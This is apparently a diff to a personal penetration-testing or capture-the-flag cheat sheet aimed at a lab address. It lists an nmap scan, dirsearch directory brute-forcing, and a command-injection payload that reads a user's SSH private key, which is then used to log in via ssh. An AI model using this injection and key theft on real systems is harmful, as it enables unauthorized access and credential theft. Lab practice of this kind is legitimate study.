@@ -6,28 +6,30 @@ Always try default credentials.
 https://tio.run/#
 sudo nmap -sC -sV -v -p- 10.10.10.10 --min-rate 10000
 
+# Enumerating Directories with dirsearch
 dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u 10.10.10.10
 dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.10
 
+You can also run dirsearch on subdirectories (ie dirsearch website.com/api)
+
+# Relevant File System Commands
 grep -r 'looking_for_this' /in/this/directory
 
 # Command Injection
 ;cat /home/<user>/.ssh/id_rsa to get the SSH key
 ;cat /home/<user>/.ssh/id.rsa
 
-#Getting Credentials
-
-
-
-
+# SSH
 
 touch id.rsa 
+
+Edit id.rsa
+
+chmod 600 id.rsa
 
 ssh -i id.rsa user@10.10.10.10
 
 # Getting Remote Command Execution
-
-
 
 # File Upload Vulnerability
 
